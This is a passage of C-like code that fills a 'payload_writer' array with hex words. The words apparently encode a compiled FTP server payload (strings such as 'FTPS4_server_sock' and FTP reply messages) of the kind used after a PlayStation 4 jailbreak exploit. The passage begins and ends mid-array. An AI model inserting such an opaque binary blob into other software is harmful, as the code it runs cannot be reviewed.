  payload_writer[4246] = 0x0049c0c7;
  payload_writer[4247] = 0xa1e90000;
  payload_writer[4248] = 0x48000008;
  payload_writer[4249] = 0x004ac0c7;
  payload_writer[4250] = 0x95e90000;
  payload_writer[4251] = 0x48000008;
  payload_writer[4252] = 0x0041c0c7;
  payload_writer[4253] = 0x89e90000;
  payload_writer[4254] = 0x48000008;
  payload_writer[4255] = 0x00cbc0c7;
  payload_writer[4256] = 0x7de90000;
  payload_writer[4257] = 0x48000008;
  payload_writer[4258] = 0x00ccc0c7;
  payload_writer[4259] = 0x71e90000;
  payload_writer[4260] = 0x48000008;
  payload_writer[4261] = 0x0223c0c7;
  payload_writer[4262] = 0x65e90000;
  payload_writer[4263] = 0x48000008;
  payload_writer[4264] = 0x023cc0c7;
  payload_writer[4265] = 0x59e90000;
  payload_writer[4266] = 0x53000008;
  payload_writer[4267] = 0x45c93145;
  payload_writer[4268] = 0xc931c031;
  payload_writer[4269] = 0xf631d231;
  payload_writer[4270] = 0x913d8d48;
  payload_writer[4271] = 0xff000014;
  payload_writer[4272] = 0x00195b15;
  payload_writer[4273] = 0x158d4800;
  payload_writer[4274] = 0x00001a2c;
  payload_writer[4275] = 0x8c358d48;
  payload_writer[4276] = 0x89000014;
  payload_writer[4277] = 0xe8c789c3;
  payload_writer[4278] = 0xfffff7d3;
  payload_writer[4279] = 0x8d48df89;
  payload_writer[4280] = 0x001a4b15;
  payload_writer[4281] = 0x358d4800;
  payload_writer[4282] = 0x00001480;
  payload_writer[4283] = 0xfff7bee8;
  payload_writer[4284] = 0x48df89ff;
  payload_writer[4285] = 0x1a4e158d;
  payload_writer[4286] = 0x8d480000;
  payload_writer[4287] = 0x00147d35;
  payload_writer[4288] = 0xf7a9e800;
  payload_writer[4289] = 0xdf89ffff;
  payload_writer[4290] = 0x09158d48;
  payload_writer[4291] = 0x4800001a;
  payload_writer[4292] = 0x1476358d;
  payload_writer[4293] = 0x94e80000;
  payload_writer[4294] = 0x89fffff7;
  payload_writer[4295] = 0x158d48df;
  payload_writer[4296] = 0x00001a1c;
  payload_writer[4297] = 0x6c358d48;
  payload_writer[4298] = 0xe8000014;
  payload_writer[4299] = 0xfffff77f;
  payload_writer[4300] = 0x8d48df89;
  payload_writer[4301] = 0x001a2715;
  payload_writer[4302] = 0x358d4800;
  payload_writer[4303] = 0x00001462;
  payload_writer[4304] = 0xfff76ae8;
  payload_writer[4305] = 0x48df89ff;
  payload_writer[4306] = 0x1a2a158d;
  payload_writer[4307] = 0x8d480000;
  payload_writer[4308] = 0x00145a35;
  payload_writer[4309] = 0xf755e800;
  payload_writer[4310] = 0xdf89ffff;
  payload_writer[4311] = 0xd5158d48;
  payload_writer[4312] = 0x48000019;
  payload_writer[4313] = 0x1452358d;
  payload_writer[4314] = 0x40e80000;
  payload_writer[4315] = 0x89fffff7;
  payload_writer[4316] = 0x158d48df;
  payload_writer[4317] = 0x00001a08;
  payload_writer[4318] = 0x48358d48;
  payload_writer[4319] = 0xe8000014;
  payload_writer[4320] = 0xfffff72b;
  payload_writer[4321] = 0x8d48df89;
  payload_writer[4322] = 0x00197b15;
  payload_writer[4323] = 0x358d4800;
  payload_writer[4324] = 0x00001445;
  payload_writer[4325] = 0xfff716e8;
  payload_writer[4326] = 0x48df89ff;
  payload_writer[4327] = 0x19ce158d;
  payload_writer[4328] = 0x8d480000;
  payload_writer[4329] = 0x00144235;
  payload_writer[4330] = 0xf701e800;
  payload_writer[4331] = 0xdf89ffff;
  payload_writer[4332] = 0x71158d48;
  payload_writer[4333] = 0x48000019;
  payload_writer[4334] = 0x143e358d;
  payload_writer[4335] = 0xece80000;
  payload_writer[4336] = 0x89fffff6;
  payload_writer[4337] = 0x158d48df;
  payload_writer[4338] = 0x00001924;
  payload_writer[4339] = 0x3a358d48;
  payload_writer[4340] = 0xe8000014;
  payload_writer[4341] = 0xfffff6d7;
  payload_writer[4342] = 0x8d48df89;
  payload_writer[4343] = 0x00191f15;
  payload_writer[4344] = 0x358d4800;
  payload_writer[4345] = 0x00001434;
  payload_writer[4346] = 0xfff6c2e8;
  payload_writer[4347] = 0x48df89ff;
  payload_writer[4348] = 0x18e2158d;
  payload_writer[4349] = 0x8d480000;
  payload_writer[4350] = 0x00142e35;
  payload_writer[4351] = 0xf6ade800;
  payload_writer[4352] = 0xdf89ffff;
  payload_writer[4353] = 0x15158d48;
  payload_writer[4354] = 0x48000019;
  payload_writer[4355] = 0x1426358d;
  payload_writer[4356] = 0x98e80000;
  payload_writer[4357] = 0x89fffff6;
  payload_writer[4358] = 0x158d48df;
  payload_writer[4359] = 0x000018f0;
  payload_writer[4360] = 0x1d358d48;
  payload_writer[4361] = 0xe8000014;
  payload_writer[4362] = 0xfffff683;
  payload_writer[4363] = 0x8d48df89;
  payload_writer[4364] = 0x0018ab15;
  payload_writer[4365] = 0x358d4800;
  payload_writer[4366] = 0x00001414;
  payload_writer[4367] = 0xfff66ee8;
  payload_writer[4368] = 0x48df89ff;
  payload_writer[4369] = 0x191e158d;
  payload_writer[4370] = 0x8d480000;
  payload_writer[4371] = 0x00140c35;
  payload_writer[4372] = 0xf659e800;
  payload_writer[4373] = 0xdf89ffff;
  payload_writer[4374] = 0xf1158d48;
  payload_writer[4375] = 0x48000018;
  payload_writer[4376] = 0x1403358d;
  payload_writer[4377] = 0x44e80000;
  payload_writer[4378] = 0x45fffff6;
  payload_writer[4379] = 0x3145c931;
  payload_writer[4380] = 0x31c931c0;
  payload_writer[4381] = 0x48f631d2;
  payload_writer[4382] = 0x13f73d8d;
  payload_writer[4383] = 0x15ff0000;
  payload_writer[4384] = 0x0000179c;
  payload_writer[4385] = 0x45158d48;
  payload_writer[4386] = 0x48000018;
  payload_writer[4387] = 0x13f5358d;
  payload_writer[4388] = 0xc3890000;
  payload_writer[4389] = 0x14e8c789;
  payload_writer[4390] = 0x89fffff6;
  payload_writer[4391] = 0x158d48df;
  payload_writer[4392] = 0x000018b4;
  payload_writer[4393] = 0xea358d48;
  payload_writer[4394] = 0xe8000013;
  payload_writer[4395] = 0xfffff5ff;
  payload_writer[4396] = 0x485bdf89;
  payload_writer[4397] = 0x182e158d;
  payload_writer[4398] = 0x8d480000;
  payload_writer[4399] = 0x0013e235;
  payload_writer[4400] = 0xf5e9e900;
  payload_writer[4401] = 0x8b50ffff;
  payload_writer[4402] = 0x0016b33d;
  payload_writer[4403] = 0x158d4800;
  payload_writer[4404] = 0x0000190c;
  payload_writer[4405] = 0xd9358d48;
  payload_writer[4406] = 0xe8000013;
  payload_writer[4407] = 0xfffff5cf;
  payload_writer[4408] = 0x169a3d8b;
  payload_writer[4409] = 0x8d480000;
  payload_writer[4410] = 0x0018c315;
  payload_writer[4411] = 0x358d4800;
  payload_writer[4412] = 0x000013d1;
  payload_writer[4413] = 0xfff5b6e8;
  payload_writer[4414] = 0x813d8bff;
  payload_writer[4415] = 0x48000016;
  payload_writer[4416] = 0x189a158d;
  payload_writer[4417] = 0x8d480000;
  payload_writer[4418] = 0x0013c735;
  payload_writer[4419] = 0xf59de800;
  payload_writer[4420] = 0x3d8bffff;
  payload_writer[4421] = 0x00001668;
  payload_writer[4422] = 0xb9158d48;
  payload_writer[4423] = 0x48000018;
  payload_writer[4424] = 0x13bf358d;
  payload_writer[4425] = 0x84e80000;
  payload_writer[4426] = 0x8bfffff5;
  payload_writer[4427] = 0x00164f3d;
  payload_writer[4428] = 0x158d4800;
  payload_writer[4429] = 0x00001880;
  payload_writer[4430] = 0xb5358d48;
  payload_writer[4431] = 0xe8000013;
  payload_writer[4432] = 0xfffff56b;
  payload_writer[4433] = 0x16363d8b;
  payload_writer[4434] = 0x8d480000;
  payload_writer[4435] = 0x00185715;
  payload_writer[4436] = 0x358d4800;
  payload_writer[4437] = 0x000013ac;
  payload_writer[4438] = 0xfff552e8;
  payload_writer[4439] = 0x1d3d8bff;
  payload_writer[4440] = 0x48000016;
  payload_writer[4441] = 0x1826158d;
  payload_writer[4442] = 0x8d480000;
  payload_writer[4443] = 0x0013a235;
  payload_writer[4444] = 0xf539e800;
  payload_writer[4445] = 0x3d8bffff;
  payload_writer[4446] = 0x00001604;
  payload_writer[4447] = 0x3d158d48;
  payload_writer[4448] = 0x48000018;
  payload_writer[4449] = 0x139a358d;
  payload_writer[4450] = 0x20e80000;
  payload_writer[4451] = 0x8bfffff5;
  payload_writer[4452] = 0x0015eb3d;
  payload_writer[4453] = 0x158d4800;
  payload_writer[4454] = 0x000017ec;
  payload_writer[4455] = 0x95358d48;
  payload_writer[4456] = 0xe8000013;
  payload_writer[4457] = 0xfffff507;
  payload_writer[4458] = 0x15d23d8b;
  payload_writer[4459] = 0x8d480000;
  payload_writer[4460] = 0x00183315;
  payload_writer[4461] = 0x358d4800;
  payload_writer[4462] = 0x00001393;
  payload_writer[4463] = 0xfff4eee8;
  payload_writer[4464] = 0xb93d8bff;
  payload_writer[4465] = 0x48000015;
  payload_writer[4466] = 0x17ca158d;
  payload_writer[4467] = 0x8d480000;
  payload_writer[4468] = 0x00138e35;
  payload_writer[4469] = 0xf4d5e800;
  payload_writer[4470] = 0x3d8bffff;
  payload_writer[4471] = 0x000015a0;
  payload_writer[4472] = 0xe9158d48;
  payload_writer[4473] = 0x48000017;
  payload_writer[4474] = 0x138c358d;
  payload_writer[4475] = 0xbce80000;
  payload_writer[4476] = 0x8bfffff4;
  payload_writer[4477] = 0x0015873d;
  payload_writer[4478] = 0x158d4800;
  payload_writer[4479] = 0x000017c8;
  payload_writer[4480] = 0x358d4859;
  payload_writer[4481] = 0x0000138b;
  payload_writer[4482] = 0xfff4a2e9;
  payload_writer[4483] = 0x314553ff;
  payload_writer[4484] = 0xc03145c9;
  payload_writer[4485] = 0xd231c931;
  payload_writer[4486] = 0x8d48f631;
  payload_writer[4487] = 0x0013883d;
  payload_writer[4488] = 0xf915ff00;
  payload_writer[4489] = 0x48000015;
  payload_writer[4490] = 0x17fa158d;
  payload_writer[4491] = 0x8d480000;
  payload_writer[4492] = 0x00138c35;
  payload_writer[4493] = 0x89c38900;
  payload_writer[4494] = 0xf471e8c7;
  payload_writer[4495] = 0xdf89ffff;
  payload_writer[4496] = 0x79158d48;
  payload_writer[4497] = 0x48000019;
  payload_writer[4498] = 0x137a358d;
  payload_writer[4499] = 0x5ce80000;
  payload_writer[4500] = 0x89fffff4;
  payload_writer[4501] = 0x158d48df;
  payload_writer[4502] = 0x000017f4;
  payload_writer[4503] = 0x6a358d48;
  payload_writer[4504] = 0xe8000013;
  payload_writer[4505] = 0xfffff447;
  payload_writer[4506] = 0x8d48df89;
  payload_writer[4507] = 0x00184f15;
  payload_writer[4508] = 0x358d4800;
  payload_writer[4509] = 0x0000135c;
  payload_writer[4510] = 0xfff432e8;
  payload_writer[4511] = 0x48df89ff;
  payload_writer[4512] = 0x18da158d;
  payload_writer[4513] = 0x8d480000;
  payload_writer[4514] = 0x00134f35;
  payload_writer[4515] = 0xf41de800;
  payload_writer[4516] = 0xdf89ffff;
  payload_writer[4517] = 0x85158d48;
  payload_writer[4518] = 0x48000018;
  payload_writer[4519] = 0x1343358d;
  payload_writer[4520] = 0x08e80000;
  payload_writer[4521] = 0x89fffff4;
  payload_writer[4522] = 0x158d48df;
  payload_writer[4523] = 0x00001760;
  payload_writer[4524] = 0x35358d48;
  payload_writer[4525] = 0xe8000013;
  payload_writer[4526] = 0xfffff3f3;
  payload_writer[4527] = 0x8d48df89;
  payload_writer[4528] = 0x00180b15;
  payload_writer[4529] = 0x358d4800;
  payload_writer[4530] = 0x00001327;
  payload_writer[4531] = 0xfff3dee8;
  payload_writer[4532] = 0x48df89ff;
  payload_writer[4533] = 0x1716158d;
  payload_writer[4534] = 0x8d480000;
  payload_writer[4535] = 0x00131935;
  payload_writer[4536] = 0xf3c9e800;
  payload_writer[4537] = 0xdf89ffff;
  payload_writer[4538] = 0xc9158d48;
  payload_writer[4539] = 0x48000017;
  payload_writer[4540] = 0x130b358d;
  payload_writer[4541] = 0xb4e80000;
  payload_writer[4542] = 0x89fffff3;
  payload_writer[4543] = 0x158d48df;
  payload_writer[4544] = 0x00001774;
  payload_writer[4545] = 0xfe358d48;
  payload_writer[4546] = 0xe8000012;
  payload_writer[4547] = 0xfffff39f;
  payload_writer[4548] = 0x8d48df89;
  payload_writer[4549] = 0x0017c715;
  payload_writer[4550] = 0x358d4800;
  payload_writer[4551] = 0x000012f0;
  payload_writer[4552] = 0xfff38ae8;
  payload_writer[4553] = 0x48df89ff;
  payload_writer[4554] = 0x1872158d;
  payload_writer[4555] = 0x8d480000;
  payload_writer[4556] = 0x0012e335;
  payload_writer[4557] = 0xf375e800;
  payload_writer[4558] = 0xdf89ffff;
  payload_writer[4559] = 0x0d158d48;
  payload_writer[4560] = 0x48000018;
  payload_writer[4561] = 0x12d5358d;
  payload_writer[4562] = 0x60e80000;
  payload_writer[4563] = 0x89fffff3;
  payload_writer[4564] = 0x158d48df;
  payload_writer[4565] = 0x00001758;
  payload_writer[4566] = 0xc7358d48;
  payload_writer[4567] = 0xe8000012;
  payload_writer[4568] = 0xfffff34b;
  payload_writer[4569] = 0x8d48df89;
  payload_writer[4570] = 0x0017fb15;
  payload_writer[4571] = 0x358d4800;
  payload_writer[4572] = 0x000012ba;
  payload_writer[4573] = 0xfff336e8;
  payload_writer[4574] = 0x48df89ff;
  payload_writer[4575] = 0x1686158d;
  payload_writer[4576] = 0x8d480000;
  payload_writer[4577] = 0x0012ad35;
  payload_writer[4578] = 0xf321e800;
  payload_writer[4579] = 0xdf89ffff;
  payload_writer[4580] = 0x41158d48;
  payload_writer[4581] = 0x48000017;
  payload_writer[4582] = 0x12a1358d;
  payload_writer[4583] = 0x0ce80000;
  payload_writer[4584] = 0x89fffff3;
  payload_writer[4585] = 0x158d48df;
  payload_writer[4586] = 0x000017fc;
  payload_writer[4587] = 0x93358d48;
  payload_writer[4588] = 0xe8000012;
  payload_writer[4589] = 0xfffff2f7;
  payload_writer[4590] = 0x8d48df89;
  payload_writer[4591] = 0x00168715;
  payload_writer[4592] = 0x358d4800;
  payload_writer[4593] = 0x00001285;
  payload_writer[4594] = 0xfff2e2e8;
  payload_writer[4595] = 0x48df89ff;
  payload_writer[4596] = 0x16ba158d;
  payload_writer[4597] = 0x8d480000;
  payload_writer[4598] = 0x00127835;
  payload_writer[4599] = 0xf2cde800;
  payload_writer[4600] = 0xdf89ffff;
  payload_writer[4601] = 0x0d158d48;
  payload_writer[4602] = 0x48000017;
  payload_writer[4603] = 0x126a358d;
  payload_writer[4604] = 0xb8e80000;
  payload_writer[4605] = 0x89fffff2;
  payload_writer[4606] = 0x158d48df;
  payload_writer[4607] = 0x00001700;
  payload_writer[4608] = 0x5d358d48;
  payload_writer[4609] = 0xe8000012;
  payload_writer[4610] = 0xfffff2a3;
  payload_writer[4611] = 0x8d48df89;
  payload_writer[4612] = 0x00164315;
  payload_writer[4613] = 0x358d4800;
  payload_writer[4614] = 0x00001247;
  payload_writer[4615] = 0xfff28ee8;
  payload_writer[4616] = 0x48df89ff;
  payload_writer[4617] = 0x1756158d;
  payload_writer[4618] = 0x8d480000;
  payload_writer[4619] = 0x00123935;
  payload_writer[4620] = 0xf279e800;
  payload_writer[4621] = 0xdf89ffff;
  payload_writer[4622] = 0x51158d48;
  payload_writer[4623] = 0x48000017;
  payload_writer[4624] = 0x122c358d;
  payload_writer[4625] = 0x64e80000;
  payload_writer[4626] = 0x89fffff2;
  payload_writer[4627] = 0x158d48df;
  payload_writer[4628] = 0x00001654;
  payload_writer[4629] = 0x1c358d48;
  payload_writer[4630] = 0xe8000012;
  payload_writer[4631] = 0xfffff24f;
  payload_writer[4632] = 0x8d48df89;
  payload_writer[4633] = 0x00159715;
  payload_writer[4634] = 0x358d4800;
  payload_writer[4635] = 0x0000120f;
  payload_writer[4636] = 0xfff23ae8;
  payload_writer[4637] = 0x48df89ff;
  payload_writer[4638] = 0x15e2158d;
  payload_writer[4639] = 0x8d480000;
  payload_writer[4640] = 0x00120335;
  payload_writer[4641] = 0xf225e800;
  payload_writer[4642] = 0xdf89ffff;
  payload_writer[4643] = 0x5d158d48;
  payload_writer[4644] = 0x48000016;
  payload_writer[4645] = 0x11f9358d;
  payload_writer[4646] = 0x10e80000;
  payload_writer[4647] = 0x89fffff2;
  payload_writer[4648] = 0x158d48df;
  payload_writer[4649] = 0x00001620;
  payload_writer[4650] = 0xeb358d48;
  payload_writer[4651] = 0xe8000011;
  payload_writer[4652] = 0xfffff1fb;
  payload_writer[4653] = 0x8d48df89;
  payload_writer[4654] = 0x00167315;
  payload_writer[4655] = 0x358d4800;
  payload_writer[4656] = 0x000011dc;
  payload_writer[4657] = 0xfff1e6e8;
  payload_writer[4658] = 0x48df89ff;
  payload_writer[4659] = 0x15c6158d;
  payload_writer[4660] = 0x8d480000;
  payload_writer[4661] = 0x0011c835;
  payload_writer[4662] = 0xf1d1e800;
  payload_writer[4663] = 0xdf89ffff;
  payload_writer[4664] = 0x11158d48;
  payload_writer[4665] = 0x48000015;
  payload_writer[4666] = 0x11b8358d;
  payload_writer[4667] = 0xbce80000;
  payload_writer[4668] = 0x89fffff1;
  payload_writer[4669] = 0x158d48df;
  payload_writer[4670] = 0x00001614;
  payload_writer[4671] = 0xab358d48;
  payload_writer[4672] = 0xe8000011;
  payload_writer[4673] = 0xfffff1a7;
  payload_writer[4674] = 0x8d48df89;
  payload_writer[4675] = 0x00155f15;
  payload_writer[4676] = 0x358d4800;
  payload_writer[4677] = 0x00001190;
  payload_writer[4678] = 0xfff192e8;
  payload_writer[4679] = 0x48df89ff;
  payload_writer[4680] = 0x164a158d;
  payload_writer[4681] = 0x8d480000;
  payload_writer[4682] = 0x00118335;
  payload_writer[4683] = 0xf17de800;
  payload_writer[4684] = 0xdf89ffff;
  payload_writer[4685] = 0x05158d48;
  payload_writer[4686] = 0x48000016;
  payload_writer[4687] = 0x1167358d;
  payload_writer[4688] = 0x68e80000;
  payload_writer[4689] = 0x89fffff1;
  payload_writer[4690] = 0x158d48df;
  payload_writer[4691] = 0x00001648;
  payload_writer[4692] = 0x61358d48;
  payload_writer[4693] = 0xe8000011;
  payload_writer[4694] = 0xfffff153;
  payload_writer[4695] = 0x8d48df89;
  payload_writer[4696] = 0x0015f315;
  payload_writer[4697] = 0x358d4800;
  payload_writer[4698] = 0x00001153;
  payload_writer[4699] = 0xfff13ee8;
  payload_writer[4700] = 0x48df89ff;
  payload_writer[4701] = 0x159e158d;
  payload_writer[4702] = 0x8d480000;
  payload_writer[4703] = 0x00114735;
  payload_writer[4704] = 0xf129e800;
  payload_writer[4705] = 0xdf89ffff;
  payload_writer[4706] = 0xe9158d48;
  payload_writer[4707] = 0x48000015;
  payload_writer[4708] = 0x113c358d;
  payload_writer[4709] = 0x14e80000;
  payload_writer[4710] = 0x89fffff1;
  payload_writer[4711] = 0x158d48df;
  payload_writer[4712] = 0x000014e4;
  payload_writer[4713] = 0x33358d48;
  payload_writer[4714] = 0xe8000011;
  payload_writer[4715] = 0xfffff0ff;
  payload_writer[4716] = 0x8d48df89;
  payload_writer[4717] = 0x00158f15;
  payload_writer[4718] = 0x358d4800;
  payload_writer[4719] = 0x00001125;
  payload_writer[4720] = 0xfff0eae8;
  payload_writer[4721] = 0x48df89ff;
  payload_writer[4722] = 0x1472158d;
  payload_writer[4723] = 0x8d480000;
  payload_writer[4724] = 0x00111835;
  payload_writer[4725] = 0xf0d5e800;
  payload_writer[4726] = 0xdf89ffff;
  payload_writer[4727] = 0x4d158d48;
  payload_writer[4728] = 0x48000014;
  payload_writer[4729] = 0x110b358d;
  payload_writer[4730] = 0xc0e80000;
  payload_writer[4731] = 0x89fffff0;
  payload_writer[4732] = 0x158d48df;
  payload_writer[4733] = 0x000015c0;
  payload_writer[4734] = 0x00358d48;
  payload_writer[4735] = 0xe8000011;
  payload_writer[4736] = 0xfffff0ab;
  payload_writer[4737] = 0x8d48df89;
  payload_writer[4738] = 0x00140b15;
  payload_writer[4739] = 0x358d4800;
  payload_writer[4740] = 0x000010f3;
  payload_writer[4741] = 0xfff096e8;
  payload_writer[4742] = 0x48df89ff;
  payload_writer[4743] = 0x13fe158d;
  payload_writer[4744] = 0x8d480000;
  payload_writer[4745] = 0x0010e635;
  payload_writer[4746] = 0xf081e800;
  payload_writer[4747] = 0xdf89ffff;
  payload_writer[4748] = 0x79158d48;
  payload_writer[4749] = 0x48000015;
  payload_writer[4750] = 0x10db358d;
  payload_writer[4751] = 0x6ce80000;
  payload_writer[4752] = 0x89fffff0;
  payload_writer[4753] = 0x158d48df;
  payload_writer[4754] = 0x00001454;
  payload_writer[4755] = 0xcf358d48;
  payload_writer[4756] = 0xe8000010;
  payload_writer[4757] = 0xfffff057;
  payload_writer[4758] = 0x8d48df89;
  payload_writer[4759] = 0x0013d715;
  payload_writer[4760] = 0x358d4800;
  payload_writer[4761] = 0x000010c0;
  payload_writer[4762] = 0xfff042e8;
  payload_writer[4763] = 0x48df89ff;
  payload_writer[4764] = 0x1492158d;
  payload_writer[4765] = 0x8d480000;
  payload_writer[4766] = 0x0010b735;
  payload_writer[4767] = 0xf02de800;
  payload_writer[4768] = 0xdf89ffff;
  payload_writer[4769] = 0x5d158d48;
  payload_writer[4770] = 0x48000014;
  payload_writer[4771] = 0x10a8358d;
  payload_writer[4772] = 0x18e80000;
  payload_writer[4773] = 0x89fffff0;
  payload_writer[4774] = 0x158d48df;
  payload_writer[4775] = 0x000014e8;
  payload_writer[4776] = 0x99358d48;
  payload_writer[4777] = 0xe8000010;
  payload_writer[4778] = 0xfffff003;
  payload_writer[4779] = 0x8d48df89;
  payload_writer[4780] = 0x0013cb15;
  payload_writer[4781] = 0x358d4800;
  payload_writer[4782] = 0x0000108b;
  payload_writer[4783] = 0xffefeee8;
  payload_writer[4784] = 0x48df89ff;
  payload_writer[4785] = 0x145e158d;
  payload_writer[4786] = 0x8d480000;
  payload_writer[4787] = 0x00107c35;
  payload_writer[4788] = 0xefd9e800;
  payload_writer[4789] = 0xdf89ffff;
  payload_writer[4790] = 0x59158d48;
  payload_writer[4791] = 0x48000014;
  payload_writer[4792] = 0x106d358d;
  payload_writer[4793] = 0xc4e80000;
  payload_writer[4794] = 0x89ffffef;
  payload_writer[4795] = 0x8d485bdf;
  payload_writer[4796] = 0x00137315;
  payload_writer[4797] = 0x358d4800;
  payload_writer[4798] = 0x0000105e;
  payload_writer[4799] = 0xffefaee9;
  payload_writer[4800] = 0xc03148ff;
  payload_writer[4801] = 0x0fca8949;
  payload_writer[4802] = 0xc3017205;
  payload_writer[4803] = 0xec3d8348;
  payload_writer[4804] = 0x00000010;
  payload_writer[4805] = 0xff501874;
  payload_writer[4806] = 0x0010e315;
  payload_writer[4807] = 0x08895900;
  payload_writer[4808] = 0xffc0c748;
  payload_writer[4809] = 0x48ffffff;
  payload_writer[4810] = 0xffffc2c7;
  payload_writer[4811] = 0x00c3ffff;
  payload_writer[4812] = 0x00000000;
  payload_writer[4813] = 0x00000000;
  payload_writer[4814] = 0x00000000;
  payload_writer[4815] = 0x00000000;
  payload_writer[4816] = 0x20303032;
  payload_writer[4817] = 0x6f206f4e;
  payload_writer[4818] = 0x61726570;
  payload_writer[4819] = 0x6e6f6974;
  payload_writer[4820] = 0x0d293b20;
  payload_writer[4821] = 0x3333000a;
  payload_writer[4822] = 0x73552031;
  payload_writer[4823] = 0x616e7265;
  payload_writer[4824] = 0x4f20656d;
  payload_writer[4825] = 0x6e202c4b;
  payload_writer[4826] = 0x20646565;
  payload_writer[4827] = 0x73736170;
  payload_writer[4828] = 0x64726f77;
  payload_writer[4829] = 0x73306220;
  payload_writer[4830] = 0x0a0d2e73;
  payload_writer[4831] = 0x30333200;
  payload_writer[4832] = 0x65735520;
  payload_writer[4833] = 0x6f6c2072;
  payload_writer[4834] = 0x64656767;
  payload_writer[4835] = 0x216e6920;
  payload_writer[4836] = 0x32000a0d;
  payload_writer[4837] = 0x47203132;
  payload_writer[4838] = 0x62646f6f;
  payload_writer[4839] = 0x73206579;
  payload_writer[4840] = 0x61706e65;
  payload_writer[4841] = 0x273a2069;
  payload_writer[4842] = 0x000a0d28;
  payload_writer[4843] = 0x20353132;
  payload_writer[4844] = 0x58494e55;
  payload_writer[4845] = 0x70795420;
  payload_writer[4846] = 0x4c203a65;
  payload_writer[4847] = 0x000a0d38;
  payload_writer[4848] = 0x53505446;
  payload_writer[4849] = 0x6c635f34;
  payload_writer[4850] = 0x746e6569;
  payload_writer[4851] = 0x5f69255f;
  payload_writer[4852] = 0x61746164;
  payload_writer[4853] = 0x636f735f;
  payload_writer[4854] = 0x0074656b;
  payload_writer[4855] = 0x20373232;
  payload_writer[4856] = 0x65746e45;
  payload_writer[4857] = 0x676e6972;
  payload_writer[4858] = 0x73615020;
  payload_writer[4859] = 0x65766973;
  payload_writer[4860] = 0x646f4d20;
  payload_writer[4861] = 0x25282065;
  payload_writer[4862] = 0x2c756868;
  payload_writer[4863] = 0x75686825;
  payload_writer[4864] = 0x6868252c;
  payload_writer[4865] = 0x68252c75;
  payload_writer[4866] = 0x252c7568;
  payload_writer[4867] = 0x2c756868;
  payload_writer[4868] = 0x75686825;
  payload_writer[4869] = 0x000a0d29;
  payload_writer[4870] = 0x20303035;
  payload_writer[4871] = 0x746e7953;
  payload_writer[4872] = 0x65207861;
  payload_writer[4873] = 0x726f7272;
  payload_writer[4874] = 0x6f63202c;
  payload_writer[4875] = 0x6e616d6d;
  payload_writer[4876] = 0x6e752064;
  payload_writer[4877] = 0x6f636572;
  payload_writer[4878] = 0x7a696e67;
  payload_writer[4879] = 0x0d2e6465;
  payload_writer[4880] = 0x6825000a;
  payload_writer[4881] = 0x252c7568;
  payload_writer[4882] = 0x2c756868;
  payload_writer[4883] = 0x75686825;
  payload_writer[4884] = 0x6868252c;
  payload_writer[4885] = 0x68252c75;
  payload_writer[4886] = 0x252c7568;
  payload_writer[4887] = 0x00756868;
  payload_writer[4888] = 0x252e6425;
  payload_writer[4889] = 0x64252e64;
  payload_writer[4890] = 0x0064252e;
  payload_writer[4891] = 0x20303032;
  payload_writer[4892] = 0x54524f50;
  payload_writer[4893] = 0x6d6f6320;
  payload_writer[4894] = 0x646e616d;
  payload_writer[4895] = 0x63757320;
  payload_writer[4896] = 0x73736563;
  payload_writer[4897] = 0x216c7566;
  payload_writer[4898] = 0x32000a0d;
  payload_writer[4899] = 0x22203735;
  payload_writer[4900] = 0x20227325;
  payload_writer[4901] = 0x74207369;
  payload_writer[4902] = 0x63206568;
  payload_writer[4903] = 0x65727275;
  payload_writer[4904] = 0x6420746e;
  payload_writer[4905] = 0x63657269;
  payload_writer[4906] = 0x79726f74;
  payload_writer[4907] = 0x000a0d2e;
  payload_writer[4908] = 0x25206325;
  payload_writer[4909] = 0x30320073;
  payload_writer[4910] = 0x6b4f2030;
  payload_writer[4911] = 0x0a0d7961;
  payload_writer[4912] = 0x34303500;
  payload_writer[4913] = 0x72724520;
  payload_writer[4914] = 0x203a726f;
  payload_writer[4915] = 0x20646162;
  payload_writer[4916] = 0x61726170;
  payload_writer[4917] = 0x6574656d;
  payload_writer[4918] = 0x0d3f7372;
  payload_writer[4919] = 0x2a25000a;
  payload_writer[4920] = 0x5d205e5b;
  payload_writer[4921] = 0x00642520;
  payload_writer[4922] = 0x20303533;
  payload_writer[4923] = 0x75736552;
  payload_writer[4924] = 0x676e696d;
  payload_writer[4925] = 0x20746120;
  payload_writer[4926] = 0x0a0d6425;
  payload_writer[4927] = 0x31313200;
  payload_writer[4928] = 0x7478652d;
  payload_writer[4929] = 0x69736e65;
  payload_writer[4930] = 0x0d736e6f;
  payload_writer[4931] = 0x4552000a;
  payload_writer[4932] = 0x53205453;
  payload_writer[4933] = 0x41455254;
  payload_writer[4934] = 0x000a0d4d;
  payload_writer[4935] = 0x20313132;
  payload_writer[4936] = 0x0d646e65;
  payload_writer[4937] = 0x3232000a;
  payload_writer[4938] = 0x54462030;
  payload_writer[4939] = 0x20345350;
  payload_writer[4940] = 0x76726553;
  payload_writer[4941] = 0x72207265;
  payload_writer[4942] = 0x79646165;
  payload_writer[4943] = 0x000a0d2e;
  payload_writer[4944] = 0x20323035;
  payload_writer[4945] = 0x72726f53;
  payload_writer[4946] = 0x63202c79;
  payload_writer[4947] = 0x616d6d6f;
  payload_writer[4948] = 0x6e20646e;
  payload_writer[4949] = 0x6920746f;
  payload_writer[4950] = 0x656c706d;
  payload_writer[4951] = 0x746e656d;
  payload_writer[4952] = 0x202e6465;
  payload_writer[4953] = 0x0a0d283a;
  payload_writer[4954] = 0x50544600;
  payload_writer[4955] = 0x735f3453;
  payload_writer[4956] = 0x65767265;
  payload_writer[4957] = 0x6f735f72;
  payload_writer[4958] = 0x2f006b63;
  payload_writer[4959] = 0x50544600;
  payload_writer[4960] = 0x635f3453;
  payload_writer[4961] = 0x6e65696c;
  payload_writer[4962] = 0x69255f74;
  payload_writer[4963] = 0x7268745f;
  payload_writer[4964] = 0x00646165;
  payload_writer[4965] = 0x20303535;
  payload_writer[4966] = 0x6c756f43;
  payload_writer[4967] = 0x6f6e2064;
  payload_writer[4968] = 0x6c612074;
  payload_writer[4969] = 0x61636f6c;
  payload_writer[4970] = 0x6d206574;
  payload_writer[4971] = 0x726f6d65;
  payload_writer[4972] = 0x0a0d2e79;
  payload_writer[4973] = 0x30353100;
  payload_writer[4974] = 0x65704f20;
  payload_writer[4975] = 0x676e696e;
  payload_writer[4976] = 0x616d4920;
  payload_writer[4977] = 0x6d206567;
  payload_writer[4978] = 0x2065646f;
  payload_writer[4979] = 0x61746164;
  payload_writer[4980] = 0x61727420;
  payload_writer[4981] = 0x6566736e;
  payload_writer[4982] = 0x0a0d2e72;
  payload_writer[4983] = 0x36323200;
